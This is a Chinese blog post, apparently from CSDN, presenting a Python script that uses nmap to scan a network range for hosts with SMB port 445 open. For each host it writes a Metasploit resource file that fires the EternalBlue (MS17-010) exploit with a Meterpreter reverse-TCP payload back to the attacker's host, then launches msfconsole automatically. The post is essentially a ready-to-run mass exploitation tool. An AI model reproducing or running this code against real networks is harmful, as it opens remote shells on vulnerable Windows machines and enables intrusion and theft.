我们首先利用 findTarget() 函数找到目标[网段](https://so.csdn.net/so/search?q=%E7%BD%91%E6%AE%B5&spm=1001.2101.3001.7020)或目标主机中开放了445端口的主机，然后利用 confickerExploit() 函数将攻击代码写入 configure.rc　配置文件中，最后调用　MSF 框架读取配置文件进行攻击！

```
# -*- coding: utf-8 -*-      
"""      
Created on Sun Nov  12 09:11:33 2018      
@author: 小谢      
"""      
import os      
import optparse      
import sys      
import nmap      1
def findTarget(Hosts):              #扫描网段范围内开放445端口的主机      1
    nmScan=nmap.PortScanner()      1
    nmScan.scan(Hosts,'445')      1
    targets=[]      1
    for t in nmScan.all_hosts():      1
        if nmScan[t].has_tcp(445):  #如果445端口提供了协议      1
            state=nmScan[t]['tcp'][445]['state']  #查看445端口的状态      1
            if state=='open':      1
                print '[+]Found Target Host:'+t      1
                targets.append(t)       2
    return targets         #返回开放445端口的主机列表      2
def confickerExploit(configFile,target,lhost):       #漏洞利用      2
    configFile.write('use exploit/windows/smb/ms17_010_eternalblue \n')  #漏洞利用代码      2
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')      2
    configFile.write('set RHOST '+str(target)+'\n')              #设定参数      2
    configFile.write('set LHOST '+lhost+'\n')      2
    configFile.write('exploit -j -z\n')    #j选项是将所有连接的会话保持在后台 -z不与任务进行即时交换      2
def main():      2
    configFile=open('configure.rc','w')  #以写入方式打开配置文件      2
    usage='[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> '      3
    parser=optparse.OptionParser(usage)      3
    parser.add_option('-H',dest='target',type='string',help='target host')           #目标主机      3
    parser.add_option('-l','-L',dest='lhost',type='string',help='listen address')    #我们的主机      3
    (options,args)=parser.parse_args()      3
    target=options.target      3
    lhost=options.lhost      3
    if (target==None)|(lhost==None):      3
        print parser.usage      3
        exit(0)      3
    targets=findTarget(options.target)           #寻找目标      4
    for target in targets:                       #逐个攻击      4
        confickerExploit(configFile,target,lhost)      4
        configFile.close()      4
        os.system('msfconsole -r configure.rc')  #启动metasploit并读取配置文件      4
if __name__=='__main__':      4
    main()
```


![](https://img-blog.csdnimg.cn/2018111216204463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)